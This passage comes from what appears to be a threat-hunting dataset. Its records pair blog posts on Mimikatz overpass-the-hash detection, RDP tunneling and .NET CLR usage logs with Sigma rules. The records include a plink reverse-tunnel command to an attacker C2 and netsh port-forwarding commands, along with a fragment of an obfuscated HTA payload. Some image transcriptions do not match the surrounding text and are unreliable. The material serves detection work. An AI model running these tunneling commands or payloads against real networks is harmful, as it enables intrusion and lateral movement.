the address space of a process)\n\nI decided to test **0x1038** in a bigger dev environment to see how this basic fingerprint would scale. Processes Accessing Lsass.exe only, I found the following:\n\n| Total Events | 0x1010 | 0x1038 |\n| ------------ | ------ | ------ |\n| 2,924,394    | 4      | 1      |\n\nThere were more than 2M events (Event ID 10) in a 30 days period, and as you can see in the small table above, **GrantedAccess 0x1010 & 0x1038** make this hunt way easier than expected. **0x1038** was Mimikatz executing the **OverPass-the-Hash** technique. Remember also that old version of Mimikatz use permission **0x1410** to access Lsass. Therefore, there needs to be some more filtering going on to get to Mimikatz. Once again, we are focusing on the permissions and not on the code or name of the script. Happy with the results so far.\n\n### EID 4648: A logon was attempted using explicit credentials?\n\nYes, the idea of **OverPass-the-hash** is to use compromised **NTLM hashes** to obtain a TGT degrading the encryption algorithm used for the challenge to then run a new process as the compromised user. This new process can then be used to access resources that the original user might not have access to. This is why we see EID 4648. This event is created when we obtained a directory list from the DC as hf\\pdulce. You can see in figure 7 below how our compromised local user **hf\\cbrown** is accessing the DC as **hf\\pdulce** (our DA account).\n\n```image\nAlt: Logon attempted using explicit credentials\nDescription: The image depicts the Event Properties for Event ID 4648 from Microsoft Windows security auditing. It details a logon attempt using explicit credentials. Key information includes the Subject's Security ID, Account Name, and Domain, alongside the Account Whose Credentials Were Used, Target Server Name, Process Information, and additional Network Information. The event is logged as an 'Audit Success' and includes a timestamp of 4/1/2017 at 12:52:37 AM.\nTranscription: |\n  Event Properties - Event 4648, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  Subject:\n    Security ID:            HF\\cbrown\n    Account Name:           cbrown\n    Account Domain:         HF\n    Logon ID:               0xc4841\n    Logon GUID:             (00000000-0000-0000-0000-000000000000)\n  \n  Account Whose Credentials Were Used:\n    Account Name:           pdulce\n    Account Domain:         HF.COM\n    Logon GUID:             (34aca21a-b78a-6d93-0d6f-6eed708797b)\n  \n  Target Server:\n    Target Server Name:     HFDC01.hf.com\n    Additional Information: cifs/HFDC01.hf.com\n  \n  Process Information:\n    Process ID:             0x4\n    Process Name:           -\n  \n  Network Information:\n    Network Address:        -\n    Port:                   -\n  \n  This event is generated when a process attempts to log on an account by explicitly specifying that account's credentials. This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.\n  \n  Log Name:                 Security\n  Source:                   Microsoft Windows security\n  Logged:                   4/1/2017 12:52:37 AM\n  Event ID:                 4648\n  Task Category:            Logon\n  Level:                    Information\n  Keywords:                 Audit Success\n  User:                     N/A\n  OpCode:                   Info\n  Computer:                 VA-WK-HR001.hf.com\n  More Information:         Event Log Online Help\n```\n\n### Where did you get EID 4768 from?\n\nI went to my DC and looked for the TGT request at the same time I asked for a directory list of the DC c$. (12:25:37 AM), and found the TGT request with Ticket Encryption Type: **0x17** which according with our table at the beginning of this article, it means RC4 Encryption. Bingo! Encryption Type downgrade behavior captured by the DC. This event will require a lot of filtering if you have old applications or systems using out of date encryption to respond to challenges and request TGTs. I would use this event to filter out the noise that I might get with other events. This will give me more context that an adversary in fact downgraded the encryption type to use the compromised NTLM hash.\n\n```image\nAlt: Encryption downgrade and TGT request\nDescription: The image displays the properties of Event ID 4768 from Microsoft Windows security auditing. It contains detailed information regarding a Kerberos authentication ticket (TGT) request. Key sections include account information (with user ID and realm), service information (service name and ID), network information (client address and port), and additional information like ticket options and encryption type (0x17, indicating RC4 encryption). The log entry also includes the timestamp of the event and relevant certificate details. This is pertinent for analyzing potential security incidents related to Kerberos authentication.\nTranscription: |\n  Event Properties - Event 4768, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  A Kerberos authentication ticket (TGT) was requested.\n  \n  Account Information:\n  - Account Name: pdulce\n  - Supplied Realm Name: hf.com\n  - User ID: HfPdulce\n  \n  Service Information:\n  - Service Name: krbtgt\n  - Service ID: HF\\krbtgt\n  \n  Network Information:\n  - Client Address: :ffff:172.18.39.100\n  - Client Port: 2345\n  \n  Additional Information:\n  - Ticket Options: 0x04801010\n  - Result Code: 0x0\n  - Ticket Encryption Type: 0x17\n  - Pre-Authentication Type: 2\n  \n  Certificate Information:\n  - Certificate Issuer Name:\n  - Certificate Serial Number:\n  - Certificate Thumbprint:\n  \n  Certificate information is only provided if a certificate was used for pre-authentication.\n  \n  Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.\n  \n  Log Name: Security\n  Source: Microsoft Windows security\n  Logged: 4/1/2017 1:45:39 AM\n  Event ID: 4768\n  Task Category: Kerberos Authentication Service\n  Level: Information\n  Keywords: Audit Success\n  User: N/A\n  OpCode: Info\n  Computer: HFDC01.hf.com\n  More Information: Event Log Online Help\n```\n\n## Final Thoughts\n\nThe more I test Mimikatz, the more impressed I get to see all the logs that it generates when it runs (disk or in-memory). Once again, I was able to find unique patterns behavior that could be really helpful to detect it and hunt for it. I would say that the following fingerprint can be generated based on the findings of this article:\n\n- EID 4624 + Logon Type 9\n- EID 4648 (Explicit Credentials)\n- EID 10 : GrantedAccess 0x1010 & 0x1038\n- EID 4768: Ticket Encryption Type 0x17 (RC4)\n\n### Hunting Techniques recommended\n\n**Grouping** Source\n\n\"Grouping consists of taking a set of multiple unique artifacts and identifying when multiple of them appear together based on certain criteria. The major difference between grouping and clustering is that in grouping your input is an explicit set of items that are each already of interest. Discovered groups within these items of interest may potentially represent a tool or a TTP that an attacker might be using. An important aspect of using this technique consists of determining the specific criteria used to group the items, such as events having occurred during a specific time window. This technique works best when you are hunting for multiple, related instances of unique artifacts, such as the case of isolating specific reconnaissance commands that were executed within a specific timeframe.\"\n\n**Searching** Source\n\nThe simplest method of hunting, searching is querying data for specific artifacts and can be performed in most tools. Unfortunately it may not always be the most effective method because it cannot produce outliers in the result set; you get exactly the results you searched for. Searching also requires a finely defined search criteria to prevent result overload. A search that is too broad will often flood an analyst with too many results to realistically process.\n\nWe could group all those chains of events, looked for them happening in a short period of time (seconds) or start searching for a few of them and start filtering out noise by adding the rest. I would start with **GrantedAccess: 0x1038** since it is the one that I got one hit in millions of records (EID 10 - TargetImage: lsass.exe). I will keep testing more commands in my next posts and keep adding to the in-memory mimikatz fingerprint.",
    "sigma_rule": {
      "title": "Successful Overpass the Hash Attempt",
      "id": "192a0330-c20b-4356-90b6-7b7049ae0b87",
      "status": "test",
      "description": "Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.",
      "references": [
        "https://web.archive.org/web/20220419045003/https://cyberwardog.blogspot.com/2017/04/chronicles-of-threat-hunter-hunting-for.html"
      ],
      "author": "Roberto Rodriguez (source), Dominik Schaudel (rule)",
      "date": "2018-02-12",
      "modified": "2021-11-27",
      "tags": [
        "attack.lateral-movement",
        "attack.s0002",
        "attack.t1550.002"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4624,
          "LogonType": 9,
          "LogonProcessName": "seclogo",
          "AuthenticationPackageName": "Negotiate"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Runas command-line tool using /netonly parameter"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_overpass_the_hash.yml",
    "id": "809"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling\n\n**January 24, 2019**\n\n---\n\nRemote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to detect.\n\n## RDPing Against the Rules\n\nThreat actors continue to prefer RDP for the stability and functionality advantages over non-graphical backdoors, which can leave unwanted artifacts on a system. As a result, FireEye has observed threat actors using native Windows RDP utilities to connect laterally across systems in compromised environments. Historically, non-exposed systems protected by a firewall and NAT rules were generally considered not to be vulnerable to inbound RDP attempts; however, threat actors have increasingly started to subvert these enterprise controls with the use of network tunneling and host-based port forwarding.\n\nNetwork tunneling and port forwarding take advantage of firewall \"pinholes\" (ports not protected by the firewall that allow an application access to a service on a host in the network protected by the firewall) to establish a connection with a remote server blocked by a firewall. Once a connection has been established to the remote server through the firewall, the connection can be used as a transport mechanism to send or \"tunnel\" local listening services (located inside the firewall) through the firewall, making them accessible to the remote server (located outside the firewall), as shown in Figure 1.\n\n```image\nAlt: Enterprise firewall bypass using RDP and network tunneling with SSH as an example\nDescription: The image illustrates a network configuration demonstrating how RDP tunneling can bypass an enterprise firewall. On the left, a Linux command and control (C2) server is shown with the IP address 192.168.60.135 and SSH service listening on TCP port 22. In the center, there is a representation of an enterprise firewall that blocks inbound connections but allows outbound connections. On the right, an enterprise network is depicted with a victim system running Windows 7, which has inbound RDP connections allowed. The green arrow indicates outbound traffic from the victim system, while the red cross signifies blocked inbound traffic from the C2 server.\nTranscription: |\n  +---------------------+-------------------------+\n  | Linux C2 Server     | 192.168.60.135          |\n  |                     | SSHd listening on TCP22 |\n  +---------------------+-------------------------+\n  | Enterprise firewall | Blocks inbound          |\n  |                     | Allows Outbound         |\n  +---------------------+-------------------------+\n  | Enterprise network  | Victim System           |\n  |                     | Windows 7               |\n  |                     | Inbound RDP allowed     |\n  +---------------------+-------------------------+\n```\n\n*Figure 1: Enterprise firewall bypass using RDP and network tunneling with SSH as an example*\n\n## Inbound RDP Tunneling\n\nA common utility used to tunnel RDP sessions is PuTTY Link, commonly known as Plink. Plink can be used to establish secure shell (SSH) network connections to other systems using arbitrary source and destination ports. Since many IT environments either do not perform protocol inspection or do not block SSH communications outbound from their network, attackers such as FIN8 have used Plink to create encrypted tunnels that allow RDP ports on infected systems to communicate back to the attacker command and control (C2) server.\n\n```\nExample Plink Executable Command:\n\nplink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389\n```\n\nFigure 2 provides an example of a successful RDP tunnel created using Plink, and Figure 3 provides an example of communications being sent through the tunnel using port forwarding from the attacker C2 server.\n\n```image\nAlt: Example of successful RDP tunnel created using Plink\nDescription: The image depicts a network diagram illustrating the process of RDP tunneling using Plink. It shows a Linux C2 (command and control) server that receives a connection on TCP port 22. The diagram highlights that the enterprise firewall blocks inbound connections but allows outbound ones. An arrow indicates the establishment of a tunnel to a victim system, where the Plink executable is executed to open the tunnel, utilizing an ephemeral TCP port for the connection. The diagram visually represents the flow of communication between the systems involved.\nTranscription: |\n  +------------------------------+---------------------+-----------------------------------+\n  | Linux C2 Server              | Enterprise firewall | Victim System                     |\n  | Received connection on TCP22 | Blocks inbound      | plink.exe executed to open tunnel |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              | Allows Outbound     |                                   |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              |                     | Ephemeral TCP port                |\n  +------------------------------+---------------------+-----------------------------------+\n```\n\n*Figure 2: Example of successful RDP tunnel created using Plink*\n\n```image\nAlt: Example of successful port forwarding from the attacker C2 server to the victim\nDescription: The image illustrates the process of RDP tunneling, specifically showing the communication flow between a Linux Command and Control (C2) server and a victim system. It depicts how RDP connections are forwarded through a secure tunnel established on TCP port 22, while the enterprise firewall blocks inbound traffic but allows outbound connections. The victim system is shown to be listening for RDP on TCP port 3389, with the text indicating the specific TCP ports involved in the tunneling process.\nTranscription: |\n  +---------------------+--------------------------------+\n  | Linux C2 Server     | RDP connect to 127.0.0.1:12345 |\n  |                     |                                |\n  |                     | TCP 12345 forwards to TCP 22   |\n  +---------------------+--------------------------------+\n  | Enterprise firewall | Blocks inbound                 |\n  |                     | Allows Outbound                |\n  +---------------------+--------------------------------+\n  |                     | RDP travels through tunnel     |\n  |                     |                                |\n  | Victim System       | Listening for RDP on TCP 3389  |\n  |                     |                                |\n  |                     | Ephemeral TCP port             |\n  +---------------------+--------------------------------+\n```\n\n*Figure 3: Example of successful port forwarding from the attacker C2 server to the victim*\n\nIt should be noted that for an attacker to be able to RDP to a system, they must already have access to the system through other means of compromise in order to create or access the necessary tunneling utility. For example, an attacker’s initial system compromise could have been the result of a payload dropped from a phishing email aimed at establishing a foothold into the environment, while simultaneously extracting credentials to escalate privileges. RDP tunneling into a compromised environment is one of many access methods typically used by attackers to maintain their presence in an environment.\n\n## Jump Box Pivoting\n\nNot only is RDP the perfect tool for accessing compromised systems externally, RDP sessions can be daisy chained across multiple systems as a way to move laterally through an environment. FireEye has observed threat actors using the native Windows Network Shell (netsh) command to utilize RDP port forwarding as a way to access newly discovered segmented networks reachable only through an administrative jump box.\n\n```\nExample netsh Port Forwarding Command:\nnetsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>\n\nExample Shortened netsh Port Forwarding Command:\nnetsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>\n```\n\nFor example, a threat actor could configure the jump box to listen on an arbitrary port for traffic being sent from a previously compromised system. The traffic would then be forwarded directly through the jump box to any system on the segmented network using any designated port, including the default RDP port TCP 3389. This type of RDP port forwarding gives threat actors a way to utilize a jump box’s allowed network routes without disrupting legitimate administrators who are using the jump box during an ongoing RDP session. Figure 4 provides an example of RDP lateral movement to a segmented network via an administrative jump box.\n\n```image\nAlt: Lateral Movement via RDP using a jump box to a segmented network\nDescription: The image illustrates a network diagram depicting the process of lateral movement via Remote Desktop Protocol (RDP) using a jump box to access a segmented network. It shows a threat actor originating from the Internet, targeting a victim system that is part of a Local Area Network (LAN) connected to a jump box. The jump box is also shown connecting to a segmented network through a firewall. RDP connections are indicated between the threat actor, the jump box, the victim system, and the segmented network, highlighting how RDP can be utilized for lateral movement in a compromised environment.\nTranscription: |\n  +---------------------+\n  |   Segmented Network  |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Firewall       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |        LAN          |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Jump Box       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Victim System    |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Threat Actor     |\n  +---------------------+\n            |\n         Internet\n```\n\n*Figure 4: Lateral Movement via RDP using a jump box to a segmented network*\n\n## Prevention and Detection of RDP Tunneling\n\nIf RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both host-based and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on establishing a baseline for remote desktop protocol.\n\n### Host-Based Prevention:\n\n- **Remote Desktop Service**: Disable the remote desktop service on all end-user workstations and systems for which the service is not required for remote connectivity.\n- **Host-based Firewalls**: Enable host-based firewall rules that explicitly deny inbound RDP connections.\n- **Local Accounts**: Prevent the use of RDP using local accounts on workstations by enabling the “Deny log on through Remote Desktop Services” security setting.\n\n### Host-Based Detection:\n\n- **Registry Keys**: Review registry keys associated with Plink connections that can be abused by RDP session tunneling to identify unique source and destination systems. By default, both PuTTY and Plink store session information and previously connected ssh servers in the following registry keys on Windows systems:\n  - `HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY`\n  - `HKEY_CURRENT_USER\\SoftWare\\SimonTatham\\PuTTY\\SshHostKeys`\n\n  Similarly, the creation of a PortProxy configuration with netsh is stored with the following Windows registry key:\n  - `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4`\n\n- **Event Logs**: Review event logs for high-fidelity logon events. Common RDP logon events are contained in the following event logs on Windows systems:\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Microsoft-TerminalServices-LocalSessionmanager%3Operational.evtx`\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Security.evtx`\n\n  The “TerminalServices-LocalSessionManager” log contains successful interactive local or remote logon events as identified by EID 21 and successful reconnection of a previously established RDP session not terminated by a proper user logout as identified by EID 25. The “Security” log contains successful Type 10 remote interactive logons (RDP) as identified by EID 4624. A source IP address recorded as a localhost IP address (127.0.0.1 – 127.255.255.255) may be indicative of a tunneled logon routed from a listening localhost port to the localhost’s RDP port TCP 3389.\n\n- Review your artifacts of execution for “plink.exe” file execution. Note that attackers can rename the file name to avoid detection. Relevant artifacts include, but are not limited to:\n  - Application Compatibility Cache/Shimcache\n  - Amcache\n  - Jump Lists\n  - Prefetch\n  - Service Events\n  - CCM Recently Used Apps from the WMI repository\n  - Registry keys\n\n### Network-Based Prevention:\n\n- **Remote Connectivity**: Where RDP is required for connectivity, enforce the connection to be initiated from a designated jump box or centralized management server.\n- **Domain Accounts**: Employ the “Deny log on through Remote Desktop Services” security setting for privileged accounts (e.g. domain administrators) and service accounts, as these types of accounts are commonly used by threat actors to laterally move to sensitive systems in an environment.\n\n### Network-Based Detection:\n\n- **Firewall Rules**: Review existing firewall rules to identify areas of vulnerability to port forwarding. In addition to the potential use of port forwarding, monitoring for internal communications between workstations in the environment should be conducted. Generally, workstations do not have a need to communicate with one another directly and Firewall rules can be used to prevent any such communication, except where needed.\n- **Network Traffic**: Perform content inspection of network traffic. Not all traffic communicating on a given port is what it appears to be. For example, threat actors may use TCP ports 80 or 443 to establish an RDP tunnel with a remote server. Deep inspection of the network traffic can likely reveal that it is not actually HTTP or HTTPS, but entirely different traffic all together. Therefore, organizations should closely monitor their network traffic.\n- **Snort Rules**: The main indicator of tunneled RDP occurs when the RDP handshake has a designated low source port generally used for another protocol. Figure 5 provides two sample Snort rules that can help security teams identify RDP tunneling in their network traffic by identifying designated low source ports generally used for other protocols.\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled msts]\"; dsize:<65; content:\"|03 00 00|\"; depth:3; content:\"|e0|\"; distance:2; within:1; content:\"Cookie: mstshash=\"; distance:5; within:17; sid:1; rev:1;)\n```\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled]\"; flow:established; content:\"|c0 00|Duca\"; depth:250; content:\"rdpdr\"; content:\"cliprdr\"; sid:2; rev:1;)\n```\n\n*Figure 5: Sample Snort Rules to identify RDP tunneling*\n\n## Conclusion\n\nRDP enables IT environments to offer freedom and interoperability to users. But with more and more threat actors using RDP to move laterally across networks with limited segmentation, security teams are being challenged to decipher between legitimate and malicious RDP traffic. Therefore, adequate host-based and network-based prevention and detection methods should be taken to actively monitor for and be able to identify malicious RDP usage.",
    "sigma_rule": {
      "title": "RDP Login from Localhost",
      "id": "51e33403-2a37-4d66-a574-1fda1782cc31",
      "status": "test",
      "description": "RDP login with localhost source address may be a tunnelled login",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/"
      ],
      "author": "Thomas Patzke",
      "date": "2019-01-28",
      "modified": "2022-10-09",
      "tags": [
        "attack.lateral-movement",
        "car.2013-07-002",
        "attack.t1021.001"
      ],
      "logsource": {
        "product": "windows",
        "service": "security"
      },
      "detection": {
        "selection": {
          "EventID": 4624,
          "LogonType": 10,
          "IpAddress": [
            "::1",
            "127.0.0.1"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\security\\account_management\\win_security_rdp_localhost_login.yml",
    "id": "813"
  },
  {
    "url": "https://web.archive.org/web/20230329154538/https://blog.menasec.net/2019/07/interesting-difr-traces-of-net-clr.html",
    "markdown": "# Interesting DFIR traces of .NET CLR Usage Logs\n\n**Date**: 16 July 2019\n\nAs most of you already know .NET has become an increasingly important component in the offensive world, with attackers making increasing direct use of it as well as indirect use of it via existing windows scripting utilities. One good example of the indirect approach is DotNetToJScript, which allow to deliver managed code via a simple JavaScript.\n\nWe decided to take a closer look to this category of malicious code delivery, which lead us to this great Offensive tool by MDSec \"SharpShooter\" (at it's heart make use of DotNetJScript).\n\nSharpShooter allow to generate multiple payload formats (hta, js, jse, vba, vbe, vbs, wsf), if your are interested about how it works or how to use it please refer to this MDSec post.\n\nFor testing purposes we will be using the .hta payload as an example, below an example of the content of our test payload (will spawn notepad.exe):\n\n```image\nAlt: Payload Example 1\nDescription: The image displays a snippet of JavaScript code that appears to be part of a malicious payload. It includes functions for decrypting and executing code, utilizing RC4 encryption with a specified key. The code is likely intended for obfuscation to deliver a payload in a stealthy manner. The content of the script suggests it's designed to manipulate or execute additional code, possibly related to .NET CLR usage logs, as discussed in the accompanying CTI context.\nTranscription: |\n  html\n  <HTML><HEAD></HEAD><BODY>\n  <script language=\"javascript\">\n  var f=function(key,str){\n      var res=[],i,j=0;\n      for(var i=0;i<str.length;++i){res[i]=str.charCodeAt(i)^key[j];j=(j+1)%key.length;}\n      return res;\n  }\n  \n  var decodeBase64=function(){var e=[],b=0,c=0,len=0;var h=\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";for(i=0;i<str.length;i+=3){e.push((h.indexOf(str.charAt(i))<<18)|(h.indexOf(str.charAt(i+1))<<12)|(h.indexOf(str.charAt(i+2))<<6)|(h.indexOf(str.charAt(i+3)))));for(j=0;j<3;j++){if(e[b]>>>(8*(2-j))&255){res.push(String.fromCharCode(e[b]>>>(8*(2-j))&255));len++;}}}\n      while(len--){if((res[len]!==null)&&(res[len]!==undefined)&&(res[len]!==\"\")){}}\n      return res;\n  }\n  \n  var encodedCode=\"...\"; // Base64 encoded string here\n```\n\nAs you can see above, it uses RC4 with the key \"'wxzomjyhto'\" to decrypt a base64 decoded blob, and then execute the resulting VBScript, below the decoded script:\n\n```image\nAlt: Payload Example 2\nDescription: The image displays a snippet of HTML and JavaScript code. The code includes a script tag that appears to involve decoding a base64-encoded string, which is likely part of a payload designed for executing malicious actions. The content suggests that it is related to the execution of .NET CLR usage logs or similar techniques for delivering managed code. This image is part of a technical discussion on malicious code delivery methods.\nTranscription: |\n  html\n  <script language=\"javascript\">\n  var decoded = atob(\"...\"); // Base64 encoded string\n  eval(decoded);\n  </script>\n  <html>\n  <body>\n  <script language=\"vbscript\">\n      ' Execute plain\n      xml.el.clone\n  </script>\n  </body>\n  </html>\n```\n\nAs you can see above, it uses the **Deserialize_2** method of the **System.Runtime.Serialization.Formatters.Binary.BinaryFormatter** COM Object which is \"high level\" how the \"DotNetToJScript\" technique works to load managed code via object Deserialization.\n\nDecoding the base64 encoded blob will lead us to a .NET executable, which will be used to load and execute our msfvenom base64 encoded shellcode (see \"o.Go\" method call), the shellcode will simply launch notepad.exe.\n\n```image\nAlt: Go Method\nDescription: The image displays a code snippet from a programming environment, focusing on a section of code related to the 'SharpShooter' tool. It shows a method named 'ShareProcess' and includes various programming elements such as class definitions, method calls, and data types. The context suggests that this code is part of an offensive security tool used for generating payloads, specifically highlighting managed code execution via .NET.\nTranscription: |\n  public void Sharing()\n  {\n      try\n      {\n          // Code for sharing\n      }\n      catch (Exception ex)\n      {\n          // Handle exception\n      }\n  }\n  \n  public void ShareResource(byte[] resource)\n  {\n      // Code to share resource\n  }\n  \n  public void AllocateMemory(int size)\n  {\n      // Allocate memory\n      byte[] buffer = new byte[size];\n      // Further processing\n  }\n  \n  public class AllocatedMemory\n  {\n      public int Size { get; set; }\n      public byte[] Data { get; set; }\n  }\n```\n\nNow let's switch to what happens when we open this .hta file, to do this we will be using Sysmon with the following configuration:\n\n**N.B:** the used sysmon config is designed to capture the relevant events we need and \"more\".\n\n```image\nAlt: Sysmon Configuration 1\nDescription: The image shows the Event Properties for a Sysmon event, specifically detailing a process creation event for 'mshta.exe'. It includes relevant fields such as the UTC time of the event, process ID, command line arguments used when launching the .hta file, and the parent process information. This detailed output is useful for digital forensics and incident response, allowing analysts to track malicious activity related to .NET CLR usage.\n```\n\n```image\nAlt: Sysmon Configuration 2\nDescription: The image shows the properties of an event captured by Sysmon, detailing a process creation event. It includes various fields such as Rule Name, Process GUID, File Name, Product, Company, Command Line, and Hashes. This information is crucial for tracking the execution of processes and analyzing potential malicious activity related to .NET CLR usage.\nTranscription: |\n  {\n    \"Event\": {\n      \"Process Create\": {\n        \"RuleName\": \"Process Create\",\n        \"UtcTime\": \"2019-07-15 21:22:51.278\",\n        \"ProcessId\": \"4403842c-eaab-52dc-0000-00109fe26962\",\n        \"Image\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"FileVersion\": \"10.0.10586.0 (WinBuild.160101.0800)\",\n        \"Description\": \"Notepad\",\n        \"Product\": \"Microsoft® Windows® Operating System\",\n        \"Company\": \"Microsoft Corporation\",\n        \"CommandLine\": \"notepad.exe\",\n        \"LogonGuid\": \"{4403842c-eaab-52dc-0000-0020039b1000}\",\n        \"LogonId\": \"0x10903\",\n        \"TerminalSessionId\": 1,\n        \"IntegrityLevel\": \"Medium\",\n        \"Hashes\": {\n          \"SHA1\": \"CA798569E531867108C744E102F84A202ABBAA6\",\n          \"MD5\": \"FA97F78B1FA59872A2ECDA2D9DF20EF\",\n          \"SHA256\": \"A1E7FBD03C580753483A187B303A92301667F1B8B9EBC8527311749023\",\n          \"IMPHASH\": \"1D40B0E7E65973B2EC7B43DF3EE5\"\n        },\n        \"ParentProcessId\": 17500,\n        \"ParentProcessGuid\": \"{4403842c-eaab-52dc-0000-00103336962}\",\n        \"ParentImage\": \"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe\",\n        \"ParentCommandLine\": \"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe \\\"C:\\\\Users\\\\sboussaeden\\\\Downloads\\\\mcafee (1).hta\\\" {1E460BDF-F1C3-4B2E-88BF-4E770A288AF5}\"\n      }\n    }\n  }\n```\n\nAs you can see above, from process execution events, we don't see any clear traces of .NET code execution. enabling CLR common modules loading logging via sysmon is not an option since it's very noisy and lot of processes loads those DLLs. Luckily for us while observing mshta.exe execution via ProcMon, we saw an interesting file being created under Microsoft .NET CLR usage logs [%localappdata%\\Microsoft\\CLR_v<version_number>\\UsageLogs\\ProcessName.exe.Log]:\n\n```image\nAlt: Usage Logs\nDescription: The image displays the Event Properties from Sysmon, specifically Event ID 11, which indicates a file creation event. It highlights the creation of a log file under the Microsoft .NET CLR Usage Logs directory. Key details include the rule name, process ID, image path of mshta.exe, and the location of the created log file. The log captures relevant timestamps and system information, emphasizing the detection of potentially suspicious managed code execution.\nTranscription: |\n  {\n    \"Event\": {\n      \"RuleName\": \"Execution - Susp ManagedCode Host Process\",\n      \"UtcTime\": \"2019-07-15 21:40:40.538\",\n      \"ProcessGuid\": \"{4403842c-f2d7-5d2c-0000-00101910c162}\",\n      \"ProcessId\": 17108,\n      \"Image\": \"C:\\\\Windows\\\\SysWOW64\\\\mshta.exe\",\n      \"TargetFilename\": \"C:\\\\Users\\\\<UserName>\\\\AppData\\\\Local\\\\Microsoft\\\\CLR_v2.0_32\\\\UsageLogs\\\\mshta.exe.log\",\n      \"CreationUtcTime\": \"2019-07-15 21:40:40.538\"\n    },\n    \"Log\": {\n      \"Name\": \"Microsoft-Windows-Sysmon/Operational\",\n      \"Source\": \"Sysmon\",\n      \"Logged\": \"7/15/2019 11:40:40 PM\",\n      \"EventId\": 11,\n      \"TaskCategory\": \"File created (rule: FileCreate)\",\n      \"Level\": \"Information\",\n      \"Keywords\": \"\"\n    }\n  }\n```\n\nThe file creation date indicate the first time the process was executed, for any further executions of the same process, the same file is updated and no file creation event is recorded. Content of the file display the list of linked assembly modules and their versions:\n\n```image\nAlt: Capture\nDescription: The image shows a text excerpt from a Notepad document containing a log or data related to .NET assemblies. It lists paths to various native images and their corresponding assembly names, such as 'System.Xml.ni.dll' and 'System.Configuration.ni.dll'. The context suggests that this log is part of the detailed information gathered from the CLR Load Logs, related to the execution of .NET code, possibly within a malware analysis or threat investigation framework.\nTranscription: |\n  {\n    \"fusion\": \"GAC\",\n    \"0\": [\n      \"C:\\\\WINDOWS\\\\assembly\\\\NativeImages_v2.0.50727_32\\\\System\\\\b8de8183f9e3cddfe1c8d8b142653\\\\System.ni.dll\",\n      \"C:\\\\WINDOWS\\\\assembly\\\\NativeImages_v2.0.50727_32\\\\System.Xml\\\\fc7b19f183dd99d27cfe7adbba9bdd\\\\System.Xml.ni.dll\",\n      \"C:\\\\WINDOWS\\\\assembly\\\\NativeImages_v2.0.50727_32\\\\System.Configuration\\\\9060561deff15046e364b70484c24115\\\\System.Configuration.ni.dll\"\n    ]\n  }\n```\n\nFirst question that comes to our mind after observing this file system precious artifact, is what are the windows native system processes that normally loads .NET code, to find out we've used 3 months of EDR process and file creation telemetry covering more 700 Windows 10 endpoints and we filtered for any process starting from \"c:\\windows\\s*\" which covers wscript.exe, cscript.exe and other processes:\n\n```image\nAlt: Capture\nDescription: The image displays a list of executable file paths from a Windows operating system. Each entry is a file path that leads to system processes and applications typically found in the 'C:\\Windows\\' directory. This list appears to be part of a diagnostic or monitoring report, possibly related to the execution or behavior of .NET applications and their logging. It showcases various system utilities and scripts used in the analysis of .NET CLR usage, relevant to Cyber Threat Intelligence.\nTranscription: |\n  C:\\Windows\\System32\\AppV\\StreamingUX.exe\n  C:\\Windows\\System32\\DriverStore\\FileRepository\\prosets\\wcomponent.inf_amd64_e9a24c476c5252e\\INFAppRunner.exe\n  C:\\Windows\\System32\\iedsl.exe\n  C:\\Windows\\System32\\ipresul.exe\n  C:\\Windows\\System32\\inetsrv\\InetMgr.exe\n  C:\\Windows\\System32\\mmc.exe\n  